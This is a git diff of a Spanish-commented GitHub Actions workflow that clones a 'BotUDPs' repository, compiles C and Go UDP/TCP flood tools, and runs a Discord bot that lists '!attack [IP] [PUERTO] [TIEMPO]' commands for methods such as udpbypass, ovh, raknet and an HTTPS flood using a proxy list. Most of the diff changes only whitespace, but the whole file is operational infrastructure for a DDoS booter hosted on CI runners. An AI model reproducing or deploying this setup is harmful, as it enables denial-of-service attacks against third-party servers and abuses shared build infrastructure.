@@ -1,4 +1,4 @@
-name: Bot Bot Bottttttttt
+name: Bot Bot Bottt
 
 on:
   workflow_dispatch:
@@ -8,13 +8,13 @@ on:
 jobs:
   clone-compile-run:
     runs-on: ubuntu-latest
-    
+
     steps:
     - name: 🗑️ Limpiar directorio anterior
       run: |
         echo "Limpiando directorios anteriores..."
         rm -rf BotUDPs 2>/dev/null || true
-    
+
     - name: 📥 Clonar repositorio
       run: |
         echo "Clonando repositorio BotUDPs..."
@@ -22,24 +22,24 @@ jobs:
           echo "❌ Error clonando, intentando clonado superficial..."
           git clone --depth 1 https://github.com/zJonch14/BotUDPs.git || exit 1
         fi
-        
+
         cd BotUDPs
         echo "✅ Repositorio clonado"
         echo "📁 Contenido:"
         ls -la
-    
+
     - name: 🐍 Configurar Python
       uses: actions/setup-python@v4
       with:
         python-version: '3.11'
-    
+
     - name: 🔧 Instalar herramientas esenciales
       run: |
         echo "Instalando herramientas..."
         sudo apt-get update
         sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
         echo "✅ Herramientas instaladas"
-    
+
     - name: 📦 Instalar discord.py
       run: |
         cd BotUDPs
@@ -59,23 +59,23 @@ jobs:
         echo "========================================"
         echo "COMPILACIÓN CON TOLERANCIA A FALLOS"
         echo "========================================"
-        
+
         # Desactivar exit-on-error para este paso
         set +e
-        
+
         echo "📋 Archivos .c encontrados:"
         find . -maxdepth 1 -name "*.c" -type f
-        
+
         compiled=0
         failed=0
-        
+
         for c_file in *.c; do
           [ -f "$c_file" ] || continue
-          
+
           binary="${c_file%.c}"
           echo ""
           echo "🔨 Compilando: $c_file → $binary"
-          
+
           # Intentar compilar cada archivo
           if gcc -O3 -pthread "$c_file" -o "$binary" 2>&1; then
             chmod +x "$binary"
@@ -94,7 +94,7 @@ jobs:
         gcc -O3 tcp.c -o tcp
         chmod +x tcp
         echo ""
-        
+
         echo ""
         echo "========================================"
         echo "RESUMEN DE COMPILACIÓN:"
@@ -106,36 +106,36 @@ jobs:
           size=$(stat -c%s "$exe" 2>/dev/null || echo "?")
           echo "  ✓ $(basename "$exe") (${size} bytes)"
         done || echo "  Ningún ejecutable encontrado"
-        
+
         # Reactivar exit-on-error
         set -e
-        
+
         echo "========================================"
         echo "⚠️  Continuando aunque algunos archivos hayan fallado"
 
-    
+
     - name: 🦾 Configurar Go para scripts .go
       run: |
         cd BotUDPs
-        
+
         # Solo si hay archivos .go
         if ls *.go >/dev/null 2>&1; then
           echo "🦾 Configurando Go..."
-          
+
           # Instalar dependencias Go
           go get github.com/sandertv/go-raknet 2>/dev/null || echo "⚠️  go-raknet opcional"
-          
+
           echo "✅ Go configurado"
         else
           echo "⚠️  No hay archivos .go, omitiendo Go"
         fi
-    
+
     - name: 🔐 Configurar token DESDE SECRET KEYS
       env:
         DISCORD_TOKEN: ${{ secrets.DISCORD_TOKEN }}
       run: |
         cd BotUDPs
-        
+
         if [ -z "$DISCORD_TOKEN" ]; then
           echo "❌ ERROR: Secret 'DISCORD_TOKEN' no configurado"
           echo "Configúralo en Settings → Secrets → Actions → DISCORD_TOKEN"
@@ -157,13 +157,13 @@ jobs:
         echo "========================================"
         echo "📅 Hora: $(date)"
         echo ""
-        
+
         # Verificar que tenemos lo mínimo necesario
         if [ ! -f "bot.py" ]; then
           echo "❌ ERROR: bot.py no encontrado"
           exit 1
         fi
-        
+
         if [ ! -f "gravitus.js" ]; then
           echo "❌ ERROR: gravitus.js no encontrado"
           exit 1
@@ -173,10 +173,10 @@ jobs:
           echo "❌ ERROR: proxy.txt no encontrado"
           exit 1
         fi
-        
+
         echo "✅ Archivos críticos verificados"
         echo "🎮 Métodos disponibles según ejecutables:"
-        
+
         # Mostrar métodos basados en ejecutables disponibles
         for method in udp udphex udppps ovh tcp udppayload udpbypass; do
           if [ -f "$method" ]; then
@@ -185,23 +185,23 @@ jobs:
         done
 
         echo "  !attack httpsrequest [IP] [PUERTO] [TIEMPO]"
-        
+
         if [ -f "udpflood.go" ]; then
           echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
         fi
-        
+
         if [ -f "raknet.go" ]; then
           echo "  !attack raknet [IP] [PUERTO] [TIEMPO]"
         fi
-        
+
         echo ""
         echo "⚡ INICIANDO BOT..."
         echo "El bot se ejecutará hasta el límite de GitHub (~6h)"
         echo ""
-        
+
         # Ejecutar bot
         python3 bot.py
-        
+
         echo ""
         echo "========================================"
         echo "BOT DETENIDO - Hora: $(date)"
